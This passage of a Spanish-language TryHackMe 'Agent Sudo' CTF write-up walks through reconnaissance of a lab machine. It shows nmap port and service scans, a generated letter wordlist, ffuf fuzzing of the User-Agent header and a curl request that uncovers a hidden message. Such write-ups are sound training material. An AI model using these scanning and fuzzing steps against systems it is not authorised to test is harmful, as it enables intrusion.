{"_path":"/writeups/tryhackme-agent-sudo","_dir":"writeups","_draft":false,"_partial":false,"_locale":"","title":"TryHackMe | Agent Sudo","description":"","published":"2025/05/30","slug":"tryhackme-agent-sudo","image":"/writeups/tryhackme-agent-sudo/thumbnail.png","body":{"type":"root","children":[{"type":"element","tag":"img","props":{"src":"/writeups/tryhackme-agent-sudo/thumbnail.png","width":"200px","heigh":"200px/"},"children":[]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"a","props":{"href":"https://tryhackme.com/room/agentsudoctf","rel":["nofollow"]},"children":[{"type":"text","value":"https://tryhackme.com/room/agentsudoctf"}]}]},{"type":"element","tag":"h2","props":{"id":"escaneo"},"children":[{"type":"text","value":"Escaneo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Escaneamos todos los 65535 puertos TCP de la maquina objetivo con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"Nmap"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -p-"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -Pn"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -T4"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -oN"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"nmap:"}]},{"type":"text","value":" Herramienta para escanear puertos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-p-:"}]},{"type":"text","value":" Escanear todos los puertos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n:"}]},{"type":"text","value":" No realizar resoluci贸n DNS."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-Pn:"}]},{"type":"text","value":" Asumir que el "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"host"}]},{"type":"text","value":" esta en linea para evitar que Nmap intente primero descubrirlo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-T4:"}]},{"type":"text","value":" Usar plantilla de temporizado 4 (\"aggresive\"). Esto no es necesario y podemos optar por usar la plantilla por defecto \"normal\" (-T3)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-oN [archivo]:"}]},{"type":"text","value":" Escribir resultados en formato \"normal\" en el archivo indicado."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Nmap scan report for 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Host is up (0.27s latency).\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Not shown: 65532 closed tcp ports (reset)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"PORT   STATE SERVICE\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"21/tcp open  ftp\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"22/tcp open  ssh\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"80/tcp open  http\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el puerto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"21"}]},{"type":"text","value":" para "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":", puerto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"22"}]},{"type":"text","value":" para "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SSH"}]},{"type":"text","value":" y puerto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"80"}]},{"type":"text","value":" para "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"HTTP"}]},{"type":"text","value":". Obtenemos informaci贸n de los puertos abiertos."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sCV"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -Pn"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -T4"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -oN"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" nmap-ports.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"nmap:"}]},{"type":"text","value":" Herramienta para escanear puertos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-sCV:"}]},{"type":"text","value":" Usar "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"scripts"}]},{"type":"text","value":" por defecto (-sC) y realizar escaneo de versiones (-sV)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n:"}]},{"type":"text","value":" No realizar resoluci贸n DNS."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-Pn:"}]},{"type":"text","value":" Asumir que el "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"host"}]},{"type":"text","value":" esta en linea para evitar que Nmap intente primero descubrirlo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-T4:"}]},{"type":"text","value":" Usar plantilla de temporizado 4 (\"aggresive\"). Esto no es necesario y podemos optar por usar la plantilla por defecto \"normal\" (-T3)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-oN [archivo]:"}]},{"type":"text","value":" Escribir resultados en formato \"normal\" en el archivo indicado."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Annoucement\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Nmap scan report for 10.10.195.209\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Host is up (0.27s latency).\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"PORT   STATE SERVICE VERSION\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"21/tcp open  ftp     vsftpd 3.0.3\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"| ssh-hostkey:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":11},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":12},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":13},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":14},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":15},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_http-title: Annoucement\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":16},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"|_http-server-header: Apache/2.4.29 (Ubuntu)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":17},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para agilizar el proceso de escaneo y enumeraci贸n, primero encontramos puertos abiertos y luego los escaneamos en busca de banners, versiones y otra informaci贸n util."}]}]},{"type":"element","tag":"h2","props":{"id":"enumeraci贸n-de-servicios"},"children":[{"type":"text","value":"Enumeraci贸n de servicios"}]},{"type":"element","tag":"h3","props":{"id":"tcp21"},"children":[{"type":"text","value":"TCP/21"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"No es posible realizar un inicio de sesi贸n an贸nimo en el servicio "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":". Por lo que tendremos que revisitar este puerto mas adelante."}]},{"type":"element","tag":"h3","props":{"id":"tcp80"},"children":[{"type":"text","value":"TCP/80"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al ingresar a la pagina web, se nos da la bienvenida con un mensaje cr铆ptico."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"img","props":{"alt":"image-1","src":"/writeups/tryhackme-agent-sudo/image-1.png"},"children":[]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"\"user-agent\" se refiere a la cabecera HTTP "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"User-Agent"}]},{"type":"text","value":", por lo que debemos de cambiarla para poder acceder. 驴Pero que \"c贸digo nombre\" debemos utilizar? Puesto que el mensaje fue firmado por "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"Agent R"}]},{"type":"text","value":", podemos intuir que nuestro c贸digo nombre corresponde a alguna de las letras del abecedario."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Creamos una lista de palabras con todas las letras del abecedario en may煤scula haciendo uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"TTPassGen"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"ttpassgen -r \"[?u]{1:1}\" wordlist.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"ttpassgen"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -r"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"[?u]{1:1}\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" wordlist.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"ttpassgen:"}]},{"type":"text","value":" Generador de listas de palabras altamente flexible escrito en Python."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-r [regla]:"}]},{"type":"text","value":"Regla a usar (consultar el repositorio de GitHub para mayor informaci贸n)."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"A\nB\nC\n[...]\nY\nZ\n","filename":"wordlist.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"A\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"B\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"C\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Y\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Z\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Enviamos solicitudes con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"ffuf"}]},{"type":"text","value":". Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, tambi茅n podemos suponer que una respuesta adecuada contendr谩 un c贸digo de respuesta diferente a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"200 OK"}]},{"type":"text","value":" o tendr谩 un tama帽o diferente al usual de 218 bytes."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para prop贸sitos educativos, elegiremos seguir las redirecciones y filtrar las respuestas basadas en su tama帽o."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"ffuf"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -u"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" http://10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -H"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"User-Agent: FUZZ\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -w"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" wordlist.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -c"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -r"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -fs"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 218\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"ffuf:"}]},{"type":"text","value":" "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"Fuzzer"}]},{"type":"text","value":" web escrito en Go."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-u [url]:"}]},{"type":"text","value":" URL objetivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-H [cabecera]:"}]},{"type":"text","value":" Cabecera \"Nombre: Valor\"."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-w [lista de palabras]:"}]},{"type":"text","value":" Ruta del archivo con la lista de palabras."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-c:"}]},{"type":"text","value":" Colorear la salida (permite distinguir mejor las respuestas por sus c贸digos)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-r:"}]},{"type":"text","value":" Seguir redirecciones."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-fs [tama帽o]:"}]},{"type":"text","value":" Filtrar respuestas HTTP por tama帽o."}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"驴Filtrar por c贸digo de respuesta o por tama帽o? Filtrar por c贸digo de respuesta nos puede llevar a omitir respuestas no est谩ndares, por lo que seguiremos la redirecciones y filtraremos por tama帽o de respuesta."}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n\n[...]\nR                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\nC                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La letra C originalmente nos redirige a otra pagina, mientras que la letra R nos muestra otro mensaje. Si hubi茅ramos filtrado todas las respuestas con c贸digo 200, hubi茅ramos omitido esta ultima respuesta."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El User-Agent R y C retornan respuestas diferentes a la est谩ndar. Al enviar una petici贸n con la cabecera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"User-Agent: R"}]},{"type":"text","value":", obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La cabecera "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"User-Agent: C"}]},{"type":"text","value":" nos revela una respuesta completamente diferente."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"curl"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sL"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -H"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"User-Agent: C\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" http://10.10.195.209/\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"curl:"}]},{"type":"text","value":" Herramienta para transferir datos desde o hacia un servidor usando URLs."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-sL:"}]},{"type":"text","value":" No mostrar barra de progreso (-s) y seguir redirecciones (-L)."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-H [cabecera]:"}]},{"type":"text","value":" Cabecera \"Nombre: Valor\"."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n\nAttention chris, <br><br>\n\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>\n\nFrom,<br>\nAgent R\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Attention chris, <br><br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! 